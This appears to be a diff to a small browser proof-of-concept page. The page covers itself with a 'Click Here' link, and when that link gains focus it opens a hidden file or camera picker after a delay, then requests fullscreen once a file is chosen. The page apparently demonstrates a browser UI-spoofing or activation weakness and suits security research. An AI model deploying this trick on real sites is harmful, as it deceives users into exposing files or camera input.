@@ -1,45 +1,19 @@
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<style>
-    h1 {
-        margin: 1em;
-    }
-
-    a {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-    }
-
-    input {
-        display: none;
-    }
-
-    img {
-        width: 100%;
-    }
-</style>
-
-
-<!-- [poc-with-system-dialog]: -->
-<input id="fileSelect" type="file" accept="image/*" />
-
-<!-- [poc-with-camera]: -->
-<!-- <input id="fileSelect" type="file" accept="*/*" /> -->
-
-<img id="img">
-<center><a id="link" href="https://www.google.com" target="_blank">Click Here</a></center>
-
 <script>
-    link.onfocus = () => {	
-
-        setTimeout(function(){fileSelect.click();}, 2500);
-
+    link.onfocus = () => {
+        setTimeout(function () {
+            fileSelect.click();
+        }, 2500);
     }
 
-    fileSelect.onchange = (event) => {
-        img.src = URL.createObjectURL(fileSelect.files[0]);
+    fileSelect.onchange = async (event) => {
+        if (fileSelect.files[0]) {
+            img.src = URL.createObjectURL(fileSelect.files[0]);
+        }
+
+        try {
+            await document.documentElement.requestFullscreen();
+        } catch (e) {
+            console.log("Fullscreen request failed:", e);
+        }
     }
 </script>
